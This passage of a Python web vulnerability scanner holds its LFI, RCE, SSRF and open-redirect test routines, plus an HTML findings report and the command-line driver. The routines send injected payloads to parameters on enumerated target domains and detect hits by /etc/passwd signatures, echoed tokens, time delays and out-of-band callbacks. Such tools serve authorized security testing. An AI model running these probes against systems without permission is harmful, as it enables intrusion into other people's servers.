                    d2[key] = t2
                    s2, h2, b2, _ = send_post_form(url, d2, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, False, not cfg.insecure)
                    loc2 = h2.get("location")
                    if (300 <= s2 < 400 and loc2) and (urlparse(loc2).netloc != urlparse(url).netloc):
                        rows.append({"url": url, "param": key, "payload": f"POST {key}: {t1} | {t2}", "evidence": f"{loc1} -> {loc2}", "evidence_type": "location-3xx", "rt_delta_ms": "0"})
                        log(f"[Redirect][POST] {url} [{key}] payloads=({t1} | {t2})")
    if "JSON" in cfg.methods and bkeys.json_keys:
        for url, _ in items:
            for key in bkeys.json_keys:
                if not payloads.redirect:
                    break
                if len(payloads.redirect) == 1:
                    t1 = payloads.redirect[0].replace("{X}", rand_token("r1"))
                    t2 = payloads.redirect[0].replace("{X}", rand_token("r2"))
                else:
                    t1 = payloads.redirect[0].replace("{X}", rand_token("r1"))
                    t2 = payloads.redirect[1].replace("{X}", rand_token("r2"))
                j1 = {k: "x" for k in bkeys.json_keys}
                j1[key] = t1
                s1, h1, b1, _ = send_post_json(url, j1, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, False, not cfg.insecure)
                loc1 = h1.get("location")
                if (300 <= s1 < 400 and loc1) and (urlparse(loc1).netloc != urlparse(url).netloc):
                    j2 = {k: "x" for k in bkeys.json_keys}
                    j2[key] = t2
                    s2, h2, b2, _ = send_post_json(url, j2, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, False, not cfg.insecure)
                    loc2 = h2.get("location")
                    if (300 <= s2 < 400 and loc2) and (urlparse(loc2).netloc != urlparse(url).netloc):
                        rows.append({"url": url, "param": key, "payload": f"JSON {key}: {t1} | {t2}", "evidence": f"{loc1} -> {loc2}", "evidence_type": "location-3xx", "rt_delta_ms": "0"})
                        log(f"[Redirect][JSON] {url} [{key}] payloads=({t1} | {t2})")
    write_findings_csv(domain_dir / "findings/open_redirect.csv", rows)


def test_lfi(domain_dir: Path, cfg: TestConfig, payloads: Payloads, bkeys: BodyKeys) -> None:
    items = iter_candidates(domain_dir / "lfitest.txt")
    rows: List[Dict[str, str]] = []
    sigs = [r"root:x:0:0:", r"\[fonts\]"]
    if "GET" in cfg.methods:
        for url, hint in items:
            params = choose_params(url, hint)
            for p in params:
                for lp in payloads.lfi:
                    s, h, b, _ = send_get(mutate_url_param(url, p, lp), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                    if any(re.search(sig, b or "", re.IGNORECASE) for sig in sigs):
                        rows.append({"url": url, "param": p, "payload": lp, "evidence": "signature", "evidence_type": "content-signature", "rt_delta_ms": "0"})
                        log(f"[LFI][GET] {url} [{p}] payload={lp}")
                        break
    if "POST" in cfg.methods and bkeys.form_keys:
        for url, _ in items:
            base = {k: "x" for k in bkeys.form_keys}
            for key in bkeys.form_keys:
                for lp in payloads.lfi:
                    d = dict(base)
                    d[key] = lp
                    s, h, b, _ = send_post_form(url, d, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                    if any(re.search(sig, b or "", re.IGNORECASE) for sig in sigs):
                        rows.append({"url": url, "param": key, "payload": f"POST {key}={lp}", "evidence": "signature", "evidence_type": "content-signature", "rt_delta_ms": "0"})
                        log(f"[LFI][POST] {url} [{key}] payload={lp}")
                        break
    if "JSON" in cfg.methods and bkeys.json_keys:
        for url, _ in items:
            base = {k: "x" for k in bkeys.json_keys}
            for key in bkeys.json_keys:
                for lp in payloads.lfi:
                    j = dict(base)
                    j[key] = lp
                    s, h, b, _ = send_post_json(url, j, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                    if any(re.search(sig, b or "", re.IGNORECASE) for sig in sigs):
                        rows.append({"url": url, "param": key, "payload": f"JSON {key}={lp}", "evidence": "signature", "evidence_type": "content-signature", "rt_delta_ms": "0"})
                        log(f"[LFI][JSON] {url} [{key}] payload={lp}")
                        break
    write_findings_csv(domain_dir / "findings/lfi.csv", rows)


def test_rce(domain_dir: Path, cfg: TestConfig, payloads: Payloads, bkeys: BodyKeys) -> None:
    items = iter_candidates(domain_dir / "rcetest.txt")
    rows: List[Dict[str, str]] = []
    if "GET" in cfg.methods:
        for url, hint in items:
            t0 = baseline_get(url, cfg)
            params = choose_params(url, hint)
            for p in params:
                tok = rand_token("rce")
                echoed = False
                for tpl in payloads.rce_echo:
                    pay = tpl.replace("{X}", tok)
                    s, h, b, _ = send_get(mutate_url_param(url, p, pay), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                    if token_in_body(b, tok):
                        rows.append({"url": url, "param": p, "payload": pay, "evidence": "echo", "evidence_type": "echo", "rt_delta_ms": "0"})
                        log(f"[RCE][GET] {url} [{p}] payload={pay}")
                        echoed = True
                        break
                if echoed:
                    continue
                for p5, p7 in zip(payloads.rce_t5, payloads.rce_t7):
                    if confirm_time_delay_get(url, p, p5, p7, cfg, t0):
                        rows.append({"url": url, "param": p, "payload": f"{p5} -> {p7}", "evidence": "sleep", "evidence_type": "time-based", "rt_delta_ms": "~5000-7000"})
                        log(f"[RCE][GET] {url} [{p}] payloads=({p5} | {p7})")
                        break
    if "POST" in cfg.methods and bkeys.form_keys:
        for url, _ in items:
            base = {k: "x" for k in bkeys.form_keys}
            t0 = baseline_post(url, base, cfg)
            for key in bkeys.form_keys:
                tok = rand_token("rce")
                echoed = False
                for tpl in payloads.rce_echo:
                    pay = tpl.replace("{X}", tok)
                    d = dict(base)
                    d[key] = pay
                    s, h, b, _ = send_post_form(url, d, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                    if token_in_body(b, tok):
                        rows.append({"url": url, "param": key, "payload": f"POST {key}={pay}", "evidence": "echo", "evidence_type": "echo", "rt_delta_ms": "0"})
                        log(f"[RCE][POST] {url} [{key}] payload={pay}")
                        echoed = True
                        break
                if echoed:
                    continue
                for p5, p7 in zip(payloads.rce_t5, payloads.rce_t7):
                    if confirm_time_delay_post(url, key, p5, p7, cfg, base, t0):
                        rows.append({"url": url, "param": key, "payload": f"POST {key}: {p5} -> {p7}", "evidence": "sleep", "evidence_type": "time-based", "rt_delta_ms": "~5000-7000"})
                        log(f"[RCE][POST] {url} [{key}] payloads=({p5} | {p7})")
                        break
    if "JSON" in cfg.methods and bkeys.json_keys:
        for url, _ in items:
            base = {k: "x" for k in bkeys.json_keys}
            t0 = baseline_json(url, base, cfg)
            for key in bkeys.json_keys:
                tok = rand_token("rce")
                echoed = False
                for tpl in payloads.rce_echo:
                    pay = tpl.replace("{X}", tok)
                    j = dict(base)
                    j[key] = pay
                    s, h, b, _ = send_post_json(url, j, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                    if token_in_body(b, tok):
                        rows.append({"url": url, "param": key, "payload": f"JSON {key}={pay}", "evidence": "echo", "evidence_type": "echo", "rt_delta_ms": "0"})
                        log(f"[RCE][JSON] {url} [{key}] payload={pay}")
                        echoed = True
                        break
                if echoed:
                    continue
                for p5, p7 in zip(payloads.rce_t5, payloads.rce_t7):
                    if confirm_time_delay_json(url, key, p5, p7, cfg, base, t0):
                        rows.append({"url": url, "param": key, "payload": f"JSON {key}: {p5} -> {p7}", "evidence": "sleep", "evidence_type": "time-based", "rt_delta_ms": "~5000-7000"})
                        log(f"[RCE][JSON] {url} [{key}] payloads=({p5} | {p7})")
                        break
    write_findings_csv(domain_dir / "findings/rce.csv", rows)


def test_ssrf(domain_dir: Path, cfg: TestConfig, payloads: Payloads, bkeys: BodyKeys) -> None:
    items = iter_candidates(domain_dir / "ssrftest.txt")
    rows: List[Dict[str, str]] = []
    def add_oast(url: str, key_or_param: str, paydesc: str):
        rows.append({"url": url, "param": key_or_param, "payload": paydesc, "evidence": "check OAST logs", "evidence_type": "oast", "rt_delta_ms": "0"})
        log(f"[SSRF] OAST sent {url} [{key_or_param}] {paydesc}")
    if "GET" in cfg.methods:
        for url, hint in items:
            params = choose_params(url, hint) or ["url"]
            if cfg.oast_url:
                t1 = cfg.oast_url.rstrip("/") + "/" + rand_token("ssrf1")
                t2 = cfg.oast_url.rstrip("/") + "/" + rand_token("ssrf2")
                for p in params:
                    _ = send_get(mutate_url_param(url, p, t1), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                    _ = send_get(mutate_url_param(url, p, t2), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                    add_oast(url, p, f"{t1} | {t2}")
            else:
                for p in params:
                    for tpl in payloads.ssrf:
                        pay = tpl.replace("{X}", rand_token("x"))
                        s, h, b, _ = send_get(mutate_url_param(url, p, pay), build_headers(cfg), cfg.timeout, True, not cfg.insecure)
                        if any(k in (b or "").lower() for k in ["refused", "connection", "metadata", "blocked by"]):
                            rows.append({"url": url, "param": p, "payload": pay, "evidence": "heuristic-error", "evidence_type": "heuristic", "rt_delta_ms": "0"})
                            log(f"[SSRF][GET] {url} [{p}] payload={pay}")
                            break
    if "POST" in cfg.methods and bkeys.form_keys:
        for url, _ in items:
            base = {k: "x" for k in bkeys.form_keys}
            for key in bkeys.form_keys:
                if cfg.oast_url:
                    t1 = cfg.oast_url.rstrip("/") + "/" + rand_token("ssrf1")
                    t2 = cfg.oast_url.rstrip("/") + "/" + rand_token("ssrf2")
                    d1 = dict(base)
                    d1[key] = t1
                    d2 = dict(base)
                    d2[key] = t2
                    _ = send_post_form(url, d1, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                    _ = send_post_form(url, d2, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                    add_oast(url, key, f"{t1} | {t2}")
                else:
                    for tpl in payloads.ssrf:
                        pay = tpl.replace("{X}", rand_token("x"))
                        d = dict(base)
                        d[key] = pay
                        s, h, b, _ = send_post_form(url, d, build_headers(cfg, {"Content-Type": "application/x-www-form-urlencoded"}), cfg.timeout, True, not cfg.insecure)
                        if any(k in (b or "").lower() for k in ["refused", "connection", "metadata", "blocked by"]):
                            rows.append({"url": url, "param": key, "payload": f"POST {key}={pay}", "evidence": "heuristic-error", "evidence_type": "heuristic", "rt_delta_ms": "0"})
                            log(f"[SSRF][POST] {url} [{key}] payload={pay}")
                            break
    if "JSON" in cfg.methods and bkeys.json_keys:
        for url, _ in items:
            base = {k: "x" for k in bkeys.json_keys}
            for key in bkeys.json_keys:
                if cfg.oast_url:
                    t1 = cfg.oast_url.rstrip("/") + "/" + rand_token("ssrf1")
                    t2 = cfg.oast_url.rstrip("/") + "/" + rand_token("ssrf2")
                    j1 = dict(base)
                    j1[key] = t1
                    j2 = dict(base)
                    j2[key] = t2
                    _ = send_post_json(url, j1, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                    _ = send_post_json(url, j2, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                    add_oast(url, key, f"{t1} | {t2}")
                else:
                    for tpl in payloads.ssrf:
                        pay = tpl.replace("{X}", rand_token("x"))
                        j = dict(base)
                        j[key] = pay
                        s, h, b, _ = send_post_json(url, j, build_headers(cfg, {"Content-Type": "application/json"}), cfg.timeout, True, not cfg.insecure)
                        if any(k in (b or "").lower() for k in ["refused", "connection", "metadata", "blocked by"]):
                            rows.append({"url": url, "param": key, "payload": f"JSON {key}={pay}", "evidence": "heuristic-error", "evidence_type": "heuristic", "rt_delta_ms": "0"})
                            log(f"[SSRF][JSON] {url} [{key}] payload={pay}")
                            break
    write_findings_csv(domain_dir / "findings/ssrf.csv", rows)


def generate_html_report(domain_dir: Path) -> Path:
    fdir = domain_dir / "findings"
    tables = {
        "XSS": read_csv(fdir / "xss.csv"),
        "SQL Injection": read_csv(fdir / "sqli.csv"),
        "Open Redirect": read_csv(fdir / "open_redirect.csv"),
        "SSRF": read_csv(fdir / "ssrf.csv"),
        "LFI": read_csv(fdir / "lfi.csv"),
        "RCE": read_csv(fdir / "rce.csv"),
    }
    total = sum(len(v) for v in tables.values())
    def esc(s: str) -> str:
        return html.escape(s or "")
    rows_html = []
    for name, rows in tables.items():
        rows_html.append(f"<h2>{esc(name)} <small>({len(rows)})</small></h2>")
        if not rows:
            rows_html.append("<p>No findings.</p>")
            continue
        rows_html.append("<table><thead><tr><th>URL</th><th>Param/Key</th><th>Payload</th><th>Evidence</th><th>Type</th></tr></thead><tbody>")
        for r in rows:
            rows_html.append(
                f"<tr><td>{esc(r.get('url',''))}</td>"
                f"<td>{esc(r.get('param',''))}</td>"
                f"<td><code>{esc(r.get('payload',''))}</code></td>"
                f"<td>{esc(r.get('evidence',''))}</td>"
                f"<td>{esc(r.get('evidence_type',''))}</td></tr>"
            )
        rows_html.append("</tbody></table>")
    html_doc = f"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><title>Findings Report</title>
<style>
body{{font-family: ui-sans-serif,system-ui,Segoe UI,Roboto,Arial,sans-serif; margin:24px;}}
h1{{margin:0 0 16px 0}}
h2{{margin-top:28px}}
table{{border-collapse:collapse;width:100%;margin:8px 0 24px 0;}}
th,td{{border:1px solid #ddd;padding:8px;vertical-align:top;}}
th{{background:#fafafa;text-align:left}}
code{{white-space:pre-wrap;word-break:break-all}}
.summary{{padding:12px 16px;background:#f5f5f5;border:1px solid #e5e5e5;border-radius:8px;margin-bottom:16px}}
</style>
</head><body>
<h1>Findings Report</h1>
<div class="summary">Total findings: <b>{total}</b></div>
{''.join(rows_html)}
</body></html>"""
    out = fdir / "report.html"
    out.write_text(html_doc, encoding="utf-8")
    log(f"HTML report written: {out}")
    return out


def read_csv(path: Path) -> List[Dict[str, str]]:
    if not path.exists():
        return []
    rows: List[Dict[str, str]] = []
    with path.open("r", encoding="utf-8") as f:
        r = csv.DictReader(f)
        for row in r:
            rows.append(row)
    return rows


def interactive_menu() -> str:
    print("\nChoose one test:")
    print(" 1) XSS")
    print(" 2) SQL Injection")
    print(" 3) Open Redirect")
    print(" 4) SSRF")
    print(" 5) LFI")
    print(" 6) RCE")
    print(" 7) Generate HTML Report")
    print(" 0) Quit")
    choice = input("> ").strip()
    mapping = {"1": "xss", "2": "sqli", "3": "redirect", "4": "ssrf", "5": "lfi", "6": "rce", "7": "report", "0": "quit"}
    return mapping.get(choice, "")


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Enum + Test (XSS/SQLi/Redirect/SSRF/LFI/RCE) | payload files + POST/JSON + HTML report")
    target = p.add_mutually_exclusive_group(required=True)
    target.add_argument("-d", "--domain")
    target.add_argument("--domains-file")
    p.add_argument("-o", "--output", default="out")
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    p.add_argument("--max-urls", type=int, default=100000)
    p.add_argument("--no-wayback", action="store_true")
    p.add_argument("--no-paramspider", action="store_true")
    p.add_argument("--no-js", action="store_true")
    p.add_argument("--include-subdomains", action="store_true")
    p.add_argument("--paramspider-args", default="")
    p.add_argument("--user-agent", default="Mozilla/5.0 (compatible; AutoEnum/1.3)")
    p.add_argument("--no-auto-install", action="store_true")
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--cookie", default=None)
    p.add_argument("--oast-url", default=None)
    p.add_argument("--non-interactive", action="store_true")
    p.add_argument("--payload-dir", default=".")
    p.add_argument("--http-methods", default="GET")
    p.add_argument("--report", action="store_true")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    print("Use only with written authorization.")
    auto_install_tools(enable=not args.no_auto_install)
    base_out = Path(args.output)
    base_out.mkdir(parents=True, exist_ok=True)
    payloads = load_payloads(Path(args.payload_dir))
    bkeys = load_bodykeys(Path(args.payload_dir))
    methods = set([m.strip().upper() for m in args.http_methods.split(",") if m.strip()])
    if not methods:
        methods = {"GET"}
    domains: List[str] = []
    if args.domain:
        domains = [args.domain.strip()]
    else:
        for line in Path(args.domains_file).read_text(encoding="utf-8").splitlines():
            s = line.strip()
            if s and not s.startswith("#"):
                domains.append(s)
    for d in domains:
        log(f"Enumerating {d}")
        process_domain_enum(d, base_out, args.threads, args.timeout, args.max_urls, not args.no_wayback, not args.no_paramspider, not args.no_js, args.include_subdomains, args.paramspider_args, args.user_agent)
    cookie = args.cookie
    if cookie is None and not args.non_interactive:
        cookie = input("Cookie (optional, empty to skip): ").strip() or None
    cfg = TestConfig(cookie=cookie, threads=args.threads, timeout=args.timeout, insecure=args.insecure, ua=args.user_agent, oast_url=args.oast_url, methods=methods)
    if args.non_interactive:
        for d in domains:
            ddir = base_out / d
            log(f"Testing {d} (all)")
            test_xss(ddir, cfg, payloads, bkeys)
            test_sqli(ddir, cfg, payloads, bkeys)
            test_redirect(ddir, cfg, payloads, bkeys)
            test_ssrf(ddir, cfg, payloads, bkeys)
            test_lfi(ddir, cfg, payloads, bkeys)
            test_rce(ddir, cfg, payloads, bkeys)
            if args.report:
                generate_html_report(ddir)
    else:
        while True:
            choice = interactive_menu()
            if choice in ("", "quit"):
                break
            for d in domains:
                ddir = base_out / d
                if choice == "xss":
                    test_xss(ddir, cfg, payloads, bkeys)
                elif choice == "sqli":
                    test_sqli(ddir, cfg, payloads, bkeys)
                elif choice == "redirect":
                    test_redirect(ddir, cfg, payloads, bkeys)
                elif choice == "ssrf":
                    test_ssrf(ddir, cfg, payloads, bkeys)
                elif choice == "lfi":
                    test_lfi(ddir, cfg, payloads, bkeys)
                elif choice == "rce":
                    test_rce(ddir, cfg, payloads, bkeys)
                elif choice == "report":
                    generate_html_report(ddir)
    print("\n===== SUMMARY =====")
    for d in domains:
        ddir = base_out / d / "findings"
        def has(p: str) -> bool:
            f = ddir / p
            return f.exists() and f.read_text(encoding="utf-8").strip() != ""
        print(f"[{d}] findings: XSS={has('xss.csv')}, SQLi={has('sqli.csv')}, Redirect={has('open_redirect.csv')}, SSRF={has('ssrf.csv')}, LFI={has('lfi.csv')}, RCE={has('rce.csv')}")
        if args.report:
            generate_html_report(base_out / d)
    print(f"Payload dir: {Path(args.payload_dir).resolve()}")
    print(f"Output root: {base_out.resolve()}")


if __name__ == "__main__":
    main()
